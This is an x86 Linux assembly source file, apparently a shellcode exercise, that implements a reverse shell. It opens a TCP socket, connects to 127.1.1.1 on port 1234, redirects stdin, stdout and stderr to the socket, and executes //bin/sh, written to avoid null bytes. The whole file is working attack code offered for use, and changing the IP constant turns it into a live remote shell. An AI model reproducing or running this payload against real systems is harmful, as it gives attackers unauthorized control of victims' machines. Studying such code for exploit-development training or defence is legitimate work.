; Author: CodeASM
; References: https://www.youtube.com/watch?v=-QWF3cQbzn4
; Completion Date: 
; Syntax: Intel
; Architecture: x86
; This program initializes a reverse shell on the executing machine and will listen for the server.
;

global _start

section .text

_start:

        xor eax, eax                    ;
        xor ebx, ebx                    ;
        xor ecx, ecx                    ; Zero out the registers for use later
        xor edx, edx                    ;
        xor edi, edi                    ;
        xor esi, esi                    ;

        mov al, 102                     ; socketcall(int callnumber, *arguments )
        mov bl, 1                       ; 1 >> SYS_SOCKET

        push esi                        ; perform socket(domain, type, protocol) ESI >> 0 >> No Protocol
        push 0x1                        ; SOCK_STREAM TCP
        push 0x2                        ; domain: IPv4 AF_INET
        mov ecx, esp                    ; call socket()
        int 0x80                        ; basically syscall - Intel x86 does not support syscall so int 0x80

                                        ; connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
        mov edx, eax                    ; save eax register in edx
        xor eax, eax                    ; zero out eax
        push esi
        push esi
        push 0x0101017f                 ; IP: 127.1.1.1 in reverse order - can't use 0 b/c null byte
        push word 0x024d                ; Port: 1234: 4d = 2 bytes, 16 bits
        push word 0x2
        mov ecx, esp                    ; call connect()

        push 16                         ; length of socket
        push ecx                        ; socket addr struct from above
        push edx                        ; socket function from eax - see line 31
        mov ecx, esp
        mov al, 102
        mov bl, 3                       ; connect()
        int 0x80                        ; execute connect()

        xor eax, eax                    ;
        mov al, 63                      ;
        mov ebx, edx                    ;
        xor ecx, ecx                    ;
        int 0x80                        ;

        xor eax, eax                    ;
        mov al, 63                      ;
        mov ebx, edx                    ; These instructions set for standard output
        xor ecx, ecx                    ;
        mov cl, 0x1                     ;
        int 0x80                        ;

        xor eax, eax                    ;
        mov al, 63                      ;
        mov ebx, edx                    ;
        xor ecx, ecx                    ;
        mov cl, 0x2                     ;
        int 0x80                        ;

        xor eax, eax                    ; execve (11 defined in header) - shell execute
        mov al, 11
        push esi                        ; 2f2f62696e2f7368 HEX = //bin/sh ASCII
        push 0x68732f6e                 ; 4 bytes at a time in reverse order
        push 0x69622f2f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80
